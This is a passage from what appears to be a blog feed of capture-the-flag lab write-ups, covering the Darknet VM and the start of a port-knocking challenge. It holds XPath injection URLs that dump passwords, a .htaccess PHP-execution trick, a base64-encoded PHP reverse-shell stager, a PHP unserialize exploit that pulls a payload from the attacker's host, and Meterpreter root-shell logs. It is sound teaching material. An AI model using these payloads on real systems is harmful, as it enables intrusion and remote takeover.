&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$xml = simplexml_load_file(&#39;users.xml&#39;);
$email = $xml-&amp;gt;xpath(&#39;/user/[id=$GET]/email&#39;);
echo $email;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In all the examples I read, those square brackets are indeed hardcoded and can be injected into a query, just like &lt;code&gt;&#39;&lt;/code&gt; with SQLi.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1][1
&#39;/user/[id=1]/email&#39; becomes &#39;/user/[id=1][1]/email&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is valid and we get &lt;code&gt;errorlevel@darknet.com&lt;/code&gt; as a result.  I want to start finding other bits of data that I can force the page to return, but to do that I need the name of the field.  Since I already know ID is a valid field, I tried to make it return that.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/id|/email[id=1][1
1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That looks successful - I can double check with the &lt;code&gt;devnull&lt;/code&gt; user to see if it returns a &lt;code&gt;2&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=2]/id|/email[id=2][1
2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next field I found was &lt;code&gt;username&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/username|/email[id=1][1
errorlevel
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Time for the holy grail, and go for &lt;code&gt;password&lt;/code&gt;?  Well that doesn&amp;rsquo;t return anything, so it&amp;rsquo;s not a valid field name.  But as we&amp;rsquo;ve seen, Darknet likes to mix things up with bits of Spanish.  So we can try&amp;hellip; &lt;code&gt;clave&lt;/code&gt;?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=1]/clave|/email[id=1][1
tc65Igkq6DF
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We can also pull the password for &lt;code&gt;devnull&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;http://signal8.darknet.com/contact.php?id=2]/clave|/email[id=2][1
j4tC1P9aqmY
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;ploy:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Ploy&lt;/h2&gt;

&lt;p&gt;After using one of the username/password combo&amp;rsquo;s to login, you are taken to another page, with a single link.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/xpanel2.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Clicking this takes you to &lt;code&gt;edit.php&lt;/code&gt; which is a &lt;code&gt;Tr0ll&lt;/code&gt; page.  Going back a step and looking at the source code of the previous page reveals these HTML comments:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;!--&amp;lt;a href=&amp;quot;ploy.php&amp;quot;&amp;gt;...&amp;lt;/a&amp;gt;--&amp;gt;
&amp;lt;!--rasta-mouse is my her0--&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I think he has the wrong rasta mouse :D&lt;/p&gt;

&lt;p&gt;Heading over to &lt;code&gt;xpanel/ploy.php&lt;/code&gt;, we are met with what looks like a file upload facility, but it&amp;rsquo;s protected by a PIN-code type challenge.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/pin.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Selecting an incorrect number of checkboxes gives you the error &lt;code&gt;La longitud de la clave no es la correcta!&lt;/code&gt; (The key length is not correct!), so we can use this to determine that the PIN is 4 in length.&lt;/p&gt;

&lt;p&gt;Looking at the source code, each box has an associated value in the following layout:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
37 58 22
12 72 10
59 17 99

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Within an example POST, we can clearly see the value for each checkbox.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/pin-post.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I went into lazy mode and used ZAP to fuzz on those values and iterate through the different combinations with the different checkbox values.  The downside to this approach, is that the fuzzer isn&amp;rsquo;t smart enough to know you don&amp;rsquo;t need to repeat values, or have the same value multiple times etc; so it took a little longer than is required - but this was probably still quicker than me sitting down to code something more efficient.  For a one-off task, who cares&amp;hellip;&lt;/p&gt;

&lt;p&gt;&amp;hellip; 6561 HTTP requests later, I now have to somehow find the 1 request with the correct PIN.  This is actually pretty easy in ZAP, as you can search your &amp;lsquo;fuzzed results&amp;rsquo; - so I did an inverse search on the string &lt;code&gt;Key incorrecta!&lt;/code&gt;.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/upload.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;h2 id=&#34;subida-exitosa:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Subida Exitosa!&lt;/h2&gt;

&lt;p&gt;My test file uploaded successfully and going back to the HTTP request, I can see the correct PIN was &lt;code&gt;37 10 59 17&lt;/code&gt;.  But now I also have to find the uploaded file.  More directory fuzzing within &lt;code&gt;xpanel&lt;/code&gt; reveals an &lt;code&gt;upload&lt;/code&gt; directory.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/test-file.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;The next thing I tried, was to upload a new PHP file, but I got the error &lt;code&gt;Formato invalido!&lt;/code&gt;.  I tried to get around this using filename manipulation and embedding PHP into images etc, but the web server just wasn&amp;rsquo;t interpreting the code as PHP.&lt;/p&gt;

&lt;p&gt;I recalled that the virtual config for &lt;code&gt;signal8.darknet.com&lt;/code&gt; had &lt;code&gt;AllowOverride All&lt;/code&gt; set, which means I can dynamically alter the config with a custom &lt;code&gt;.htaccess&lt;/code&gt; file.  I used this to exectute PHP from within the &lt;code&gt;.htaccess&lt;/code&gt; file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;AddHandler application/x-httpd-php .htaccess
DirectoryIndex .htaccess
&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;
        Order deny,allow
        Allow from all
        SetHandler application/x-httpd-suphp
&amp;lt;/FilesMatch&amp;gt;
#&amp;lt;?php phpinfo(); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/darknet-1/ht-phpinfo.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;This time around I saw that &lt;code&gt;open_basedir&lt;/code&gt; is not set, so I should be able to read a lot more of the filesystem this time.  But I want some sort of functional shell, I don&amp;rsquo;t want to be faffing around writing my own PHP for doing bits.  So I uploaded a PHP Meterpreter payload, which gave me enough functionality to list and read files etc.  I did this by putting PHP code into &lt;code&gt;.htaccess&lt;/code&gt; to write base64 content out to a new file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;AddHandler application/x-httpd-php .htaccess
DirectoryIndex .htaccess
&amp;lt;FilesMatch &amp;quot;^\.htaccess&amp;quot;&amp;gt;
        Order deny,allow
        Allow from all
        SetHandler application/x-httpd-suphp
&amp;lt;/FilesMatch&amp;gt;
#&amp;lt;?php $content = base64_decode(&amp;quot;PD9waHAKCmVycm9yX3JlcG9ydGluZygwKTsKIyBUaGUgcGF5bG9hZCBoYW5kbGVyIG92ZXJ3cml0ZXMgdGhpcyB3aXRoIHRoZSBjb3JyZWN0IExIT1NUIGJlZm9yZSBzZW5kaW5nCiMgaXQgdG8gdGhlIHZpY3RpbS4KJGlwID0gJzE5Mi4xNjguNTYuMTAxJzsKJHBvcnQgPSA0NDQ0OwokaXBmID0gQUZfSU5FVDsKCmlmIChGQUxTRSAhPT0gc3RycG9zKCRpcCwgIjoiKSkgewoJIyBpcHY2IHJlcXVpcmVzIGJyYWNrZXRzIGFyb3VuZCB0aGUgYWRkcmVzcwoJJGlwID0gIlsiLiAkaXAgLiJdIjsKCSRpcGYgPSBBRl9JTkVUNjsKfQoKaWYgKCgkZiA9ICdzdHJlYW1fc29ja2V0X2NsaWVudCcpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigidGNwOi8veyRpcH06eyRwb3J0fSIpOwoJJHNfdHlwZSA9ICdzdHJlYW0nOwp9IGVsc2VpZiAoKCRmID0gJ2Zzb2Nrb3BlbicpICYmIGlzX2NhbGxhYmxlKCRmKSkgewoJJHMgPSAkZigkaXAsICRwb3J0KTsKCSRzX3R5cGUgPSAnc3RyZWFtJzsKfSBlbHNlaWYgKCgkZiA9ICdzb2NrZXRfY3JlYXRlJykgJiYgaXNfY2FsbGFibGUoJGYpKSB7CgkkcyA9ICRmKCRpcGYsIFNPQ0tfU1RSRUFNLCBTT0xfVENQKTsKCSRyZXMgPSBAc29ja2V0X2Nvbm5lY3QoJHMsICRpcCwgJHBvcnQpOwoJaWYgKCEkcmVzKSB7IGRpZSgpOyB9Cgkkc190eXBlID0gJ3NvY2tldCc7Cn0gZWxzZSB7CglkaWUoJ25vIHNvY2tldCBmdW5jcycpOwp9CmlmICghJHMpIHsgZGllKCdubyBzb2NrZXQnKTsgfQoKc3dpdGNoICgkc190eXBlKSB7IApjYXNlICdzdHJlYW0nOiAkbGVuID0gZnJlYWQoJHMsIDQpOyBicmVhazsKY2FzZSAnc29ja2V0JzogJGxlbiA9IHNvY2tldF9yZWFkKCRzLCA0KTsgYnJlYWs7Cn0KaWYgKCEkbGVuKSB7CgkjIFdlIGZhaWxlZCBvbiB0aGUgbWFpbiBzb2NrZXQuICBUaGVyZSdzIG5vIHdheSB0byBjb250aW51ZSwgc28KCSMgYmFpbAoJZGllKCk7Cn0KJGEgPSB1bnBhY2soIk5sZW4iLCAkbGVuKTsKJGxlbiA9ICRhWydsZW4nXTsKCiRiID0gJyc7CndoaWxlIChzdHJsZW4oJGIpIDwgJGxlbikgewoJc3dpdGNoICgkc190eXBlKSB7IAoJY2FzZSAnc3RyZWFtJzogJGIgLj0gZnJlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJY2FzZSAnc29ja2V0JzogJGIgLj0gc29ja2V0X3JlYWQoJHMsICRsZW4tc3RybGVuKCRiKSk7IGJyZWFrOwoJfQp9CgojIFNldCB1cCB0aGUgc29ja2V0IGZvciB0aGUgbWFpbiBzdGFnZSB0byB1c2UuCiRHTE9CQUxTWydtc2dzb2NrJ10gPSAkczsKJEdMT0JBTFNbJ21zZ3NvY2tfdHlwZSddID0gJHNfdHlwZTsKZXZhbCgkYik7CmRpZSgpOwo=&amp;quot;); $file = fopen(&amp;quot;/home/errorlevel/public_html/xpanel/uploads/shell.php&amp;quot;,&amp;quot;w&amp;quot;); echo fwrite($file,$content); fclose($file); ?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;You will of course notice that we are using &lt;code&gt;suphp&lt;/code&gt;.  At first, I tried using plain ole&amp;rsquo; regular &lt;code&gt;php&lt;/code&gt; but it lacks the permission to write into &lt;code&gt;errorlevel&lt;/code&gt;&amp;rsquo;s home directory.  SuPHP is able to execute PHP files with the same permissions as its owner and we can see that the suPHP module is loaded in &lt;code&gt;/etc/apache2/mods-enabled/&lt;/code&gt;.  Since we&amp;rsquo;re in &lt;code&gt;/home/errorlevel&lt;/code&gt; it&amp;rsquo;s reasonable to assume &lt;code&gt;errorlevel&lt;/code&gt; is also the owner of these PHP files.&lt;/p&gt;

&lt;p&gt;A &lt;code&gt;multi/handler&lt;/code&gt; later and we have a shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
meterpreter &amp;gt; sysinfo 
Computer    : Darknet
OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
Meterpreter : php/php
meterpreter &amp;gt; getuid 
Server username: errorlevel (1002)

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-final-dark-hurdle:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;The Final Dark Hurdle&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
Listing: /var/www
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
40755/rwxr-xr-x   4096  dir   2015-04-26 15:22:35 +0100  Classes
40755/rwxr-xr-x   4096  dir   2015-04-26 16:07:45 +0100  access
100644/rw-r--r--  378   fil   2015-03-23 06:10:38 +0000  index.html
100644/rw-r--r--  157   fil   2015-04-26 15:21:11 +0100  sec.php

Listing: /var/www/Classes
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  163   fil   2015-04-26 15:22:35 +0100  Show.php
100644/rw-r--r--  319   fil   2015-04-26 15:27:16 +0100  Test.php

&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;sec-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;sec.php&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

require &amp;quot;Classes/Test.php&amp;quot;;
require &amp;quot;Classes/Show.php&amp;quot;;

if(!empty($_POST[&#39;test&#39;])){
    $d=$_POST[&#39;test&#39;];
    $j=unserialize($d);
    echo $j;
}
?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;test-php:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Test.php&lt;/h4&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Test {

    public $url;
    public $name_file;
    public $path;

    function __destruct(){
        $data=file_get_contents($this-&amp;gt;url);
        $f=fopen($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, &amp;quot;w&amp;quot;);
        fwrite($f, $data);
        fclose($f);
        chmod($this-&amp;gt;path.&amp;quot;/&amp;quot;.$this-&amp;gt;name_file, 0644);
}
}

?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;#### Show.php&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Show {

    public $woot;

    function __toString(){
        return &amp;quot;Showme&amp;quot;;        

}
    function Pwnme(){
        $this-&amp;gt;woot=&amp;quot;ROOT&amp;quot;;

}

}

?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So the story here is fairly self explanatory - we need to POST a serialised string to &lt;code&gt;sec.php&lt;/code&gt;, which is passed to &lt;code&gt;Test.php&lt;/code&gt; and &lt;code&gt;Show.php&lt;/code&gt;.  The end result is that a new file can be written to &lt;code&gt;/var/www&lt;/code&gt; and have it &lt;code&gt;chmod&#39;d&lt;/code&gt; to set &lt;code&gt;root&lt;/code&gt; as owner.  Given we are using &lt;code&gt;suphp&lt;/code&gt;, this will also execute as root and give us a root shell.&lt;/p&gt;

&lt;p&gt;I generated placed a PHP Meterpreter payload into my &lt;code&gt;/var/www&lt;/code&gt; folder, named it &lt;code&gt;root&lt;/code&gt; and started &lt;code&gt;apache2&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;serialization:ce3f29a7309c858ac5469dc7533e0e59&#34;&gt;Serialization&lt;/h2&gt;

&lt;p&gt;First checked my serialization was working, using the &lt;code&gt;Show&lt;/code&gt; class.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Show {

        public $woot = &amp;quot;woot&amp;quot;;

}

print serialize(new Show);

?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
# php pwn.php 
O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}

# curl 192.168.56.102/sec.php -d &#39;test=O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}&#39;
Showme

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, that&amp;rsquo;s all good.  Now we just need to add in the &lt;code&gt;Test&lt;/code&gt; class with my desired values.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;
&amp;lt;?php

class Test {

        public $url = &amp;quot;http://192.168.56.101/root&amp;quot;;
        public $name_file = &amp;quot;root.php&amp;quot;;
        public $path = &amp;quot;/var/www&amp;quot;;

}

class Show {

        public $woot = &amp;quot;woot&amp;quot;;

}

$_test = (new Test);
$_show = (new Show);

print serialize(array($_test, $_show));

?&amp;gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
# php pwn.php 
a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:26:&amp;quot;http://192.168.56.101/root&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;root.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}}

# curl 192.168.56.102/sec.php -d &#39;test=a:2:{i:0;O:4:&amp;quot;Test&amp;quot;:3:{s:3:&amp;quot;url&amp;quot;;s:26:&amp;quot;http://192.168.56.101/root&amp;quot;;s:9:&amp;quot;name_file&amp;quot;;s:8:&amp;quot;root.php&amp;quot;;s:4:&amp;quot;path&amp;quot;;s:8:&amp;quot;/var/www&amp;quot;;}i:1;O:4:&amp;quot;Show&amp;quot;:1:{s:4:&amp;quot;woot&amp;quot;;s:4:&amp;quot;woot&amp;quot;;}}&#39;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Monitoring my Apache access log, I can see a GET request - a good sign!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
# tail -f /var/log/apache2/access.log 
192.168.56.102 - - [13/Jun/2015:11:56:45 +0100] &amp;quot;GET /root HTTP/1.0&amp;quot; 200 1546 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, time to fire up my &lt;code&gt;multi/handler&lt;/code&gt; again&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
msf exploit(handler) &amp;gt; exploit 

[*] Started reverse handler on 192.168.56.101:4444 
[*] Starting the payload handler...

# curl http://192.168.56.102/root.php

[*] Sending stage (40499 bytes) to 192.168.56.102
[*] Meterpreter session 3 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.102:41202) at 2015-06-13 12:05:52 +0100

meterpreter &amp;gt; sysinfo 
Computer    : Darknet
OS          : Linux Darknet 3.2.0-4-486 #1 Debian 3.2.65-1+deb7u2 i686
Meterpreter : php/php
meterpreter &amp;gt; getuid 
Server username: root (0)

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Quick, grab dat flag!&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;
meterpreter &amp;gt; cat /root/flag.txt
      ___           ___           ___           ___           ___           ___           ___     
     /\  \         /\  \         /\  \         /\__\         /\__\         /\  \         /\  \    
    /::\  \       /::\  \       /::\  \       /:/  /        /::|  |       /::\  \        \:\  \   
   /:/\:\  \     /:/\:\  \     /:/\:\  \     /:/__/        /:|:|  |      /:/\:\  \        \:\  \  
  /:/  \:\__\   /::\~\:\  \   /::\~\:\  \   /::\__\____   /:/|:|  |__   /::\~\:\  \       /::\  \ 
 /:/__/ \:|__| /:/\:\ \:\__\ /:/\:\ \:\__\ /:/\:::::\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /:/\:\__\
 \:\  \ /:/  / \/__\:\/:/  / \/_|::\/:/  / \/_|:|~~|~    \/__|:|/:/  / \:\~\:\ \/__/    /:/  \/__/
  \:\  /:/  /       \::/  /     |:|::/  /     |:|  |         |:/:/  /   \:\ \:\__\     /:/  /     
   \:\/:/  /        /:/  /      |:|\/__/      |:|  |         |::/  /     \:\ \/__/     \/__/      
    \::/__/        /:/  /       |:|  |        |:|  |         /:/  /       \:\__\                  
     ~~            \/__/         \|__|         \|__|         \/__/         \/__/                 



     Sabia que podias Campeon!, espero que esta VM haya sido de tu agrado y te hayas divertido
     tratando de llegar hasta aca. Eso es lo que realmente importa!.


#Blog: www.securitysignal.org

#Twitter: @SecSignal, @q3rv0

&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>TopHatSec: FartKnocker</title>
      <link>https://rastamouse.me/writeups/2015/fartknocker/</link>
      <pubDate>Fri, 10 Apr 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/fartknocker/</guid>
      <description>

&lt;p&gt;This VM has a focus on port knocking, the clues for which are buried in packet captures.&lt;/p&gt;

&lt;h2 id=&#34;discovery:e5233222f13543d15163b8fc77c786fb&#34;&gt;Discovery&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.103

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Site doesn&#39;t have a title (text/html).
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-once:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Once&lt;/h2&gt;

&lt;p&gt;The webpage on port 80 contains a simple HTML file, with a link to the first packet capture.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;a href=&amp;quot;pcap1.pcap&amp;quot;&amp;gt;Wooah&amp;lt;/a&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So let&amp;rsquo;s download this and have a look in Wireshark.  There are 2 main sections separated by ICMP request/replies.&lt;/p&gt;

&lt;p&gt;&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/fartknocker/pcap1.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;
&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/fartknocker/pcap1-2.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;&lt;/p&gt;

&lt;p&gt;The first sequence of packets are SYN packets to ports &lt;code&gt;7000&lt;/code&gt;, &lt;code&gt;8000&lt;/code&gt; and &lt;code&gt;9000&lt;/code&gt;.  The second sequence are more SYN packets to ports &lt;code&gt;7000&lt;/code&gt;, &lt;code&gt;8000&lt;/code&gt;, &lt;code&gt;9000&lt;/code&gt; and &lt;code&gt;8888&lt;/code&gt;.
Knocking these ports opens ports &lt;code&gt;8888&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 7000 8000 9000 7000 8000 9000 8888; nc 192.168.56.103 8888
hitting tcp 192.168.56.103:7000
hitting tcp 192.168.56.103:8000
hitting tcp 192.168.56.103:9000
hitting tcp 192.168.56.103:7000
hitting tcp 192.168.56.103:8000
hitting tcp 192.168.56.103:9000
hitting tcp 192.168.56.103:8888
/burgerworld/
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;knock-twice:e5233222f13543d15163b8fc77c786fb&#34;&gt;Knock Twice&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# curl 192.168.56.103/burgerworld/
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
&amp;lt;a href=&amp;quot;pcap2.pcap&amp;quot;&amp;gt;heheh...hehh..&amp;lt;/a&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# wget 192.168.56.103/burgerworld/pcap2.pcap
root@kali:~# wireshark pcap2.pcap 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are quite a few more packets this time, so I made the review a bit easier by putting a source IP filter in place.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/fartknocker/pcap2.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;This time we have a SYN on port &lt;code&gt;21&lt;/code&gt;, UDP packet on port &lt;code&gt;22&lt;/code&gt;, SYN on &lt;code&gt;80&lt;/code&gt; and a SYN on &lt;code&gt;8080&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
hitting tcp 192.168.56.103:21
hitting udp 192.168.56.103:22
hitting tcp 192.168.56.103:80
hitting tcp 192.168.56.103:8080
(UNKNOWN) [192.168.56.103] 8080 (http-alt) : Connection refused
root@kali:~# knock -v 192.168.56.103 21 22:udp 80 8080; nc 192.168.56.103 8080
hitting tcp 192.168.56.103:21
hitting udp 192.168.56.103:22
hitting tcp 192.168.56.103:80
hitting tcp 192.168.56.103:8080

                      MMMMMMM           MMMMMMH 
                HMMMMM:::::::.MMMMMMMMMM:::::.TMM
              MMMI:::::::::::::::::::MMH::::::::TM
            MMIi::::::::::::.:::::::::::::::::::::MMMM
           MT::::.::::::::::::::::::::::::::::::.::=T.IMMM
         MMMi:::::::::::::::::::::::::::::::::::::::::::MT)MM
     MMMI.:::::::::::::::::::::::::::::::::::::::::::.:::M= MM
   XMXi::::::::::::::::::::::.:::::::::::::::::::::::::::::::=MM
   MMi::::::::::::::::::::::::::::::::::::::::::::::::::.::..:=MMM
  MM:MMT:::::::::.:::::::::::::::::.:::::::::::::::::::::::::::MiMM
   MMM::::::::::::::::::.::::::::::::::::::::::::::.::::::::::.TM.MM
   MMi::::::::::::::.::::::::::::::::::::::::::::::::::::::.:::.:: M
   MM:::.::::::::::::::::::::::::::::::::.:.:::::::::::::::::::::: XM
 MM:MT::.::::::::::::::::::::::::::::::::::::::::::::::::::::::::::XM
IMM:::.::::::::::::::::::::::::::::::::::: :::::::::::::::::::::::.=M
 MM::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::: :::M
 XMT:::::::::::::::::::::: ::::::::::::::::: : ::::::::::::::::::: iM
   MiMi:::::::::: :::::::::::::::::::::::::::::::: ::::::::::::::.:IM
     M::::::HH::::::::::::::::::::::::::::::::::::::::::::::::::::: M
     MT:::::iM::::::::Hi:iXH:::ii::XH:::::::::::::.::::::::::::::.:.M
      MX:::::iMX:i::::iMi:iMH::XH::Mi:::::::::::::::::::::::::::::: M
        Mii::::HMH:::::iMH::MH=:MM=TMi::::::::::::::::::::::::::::::MM
          MMMMMMMMMMMXTi:MMHi:HMMIMMMMii::::::::::::::::::::::::::::XM
           XXOXMMT:. ::T= :IMMMMMMM=iXMii:::::::::::::::::::::::::: MM
            MMMH:::.:::::::.::::.::::.:XMi::::::::::::::::::::::::::MM
           XMM::.:.:..::..:.:.::.:.::: ::XMi::::::::::::::::::::::::MX
          XMMT::::.:.::.::::.::.::::::::.::XH:::::::::::::::::::::: M
          HMX::...:..::..:.:.::::::..... :::XX::::::::::::::.:::::. M
          MM:::....:::::.::::::..:::::.:..:::HX::::::::::::::::::::=M
          MX::::::::::::::::::::::..::::.:..::X::::::::::::::::::::IM
         XMI..  .:.::....:..::::.:: ::...::.:.MH:::::::::::::::::.: M
         MM:. ::..::....::.::::::....:.:...:..MT::.   ::::::::: :..IM
         MM=:::::.::.:::::..::::.: .::..::..::Mi:::::::::::::::::: MM
         MMI:::...:  .::..::::::.:::::::.::::TM:::::::::::::::::::=MO
          MH.: .::::.::.. .:::::iLMXX=::::.:.Mi::::::: ::::::::::.MM
          MX:.:..:: .:.:.:.: :MMM:::..:::::.HM:::: :::::::::::::.MM
          MM:::...::....: ::IMT:::.:...:.::.MT::::::: ::::::::: MM
           M=::..::::..:::MM:i:..::.:...: ::M:::: ::: ::::::::::MI
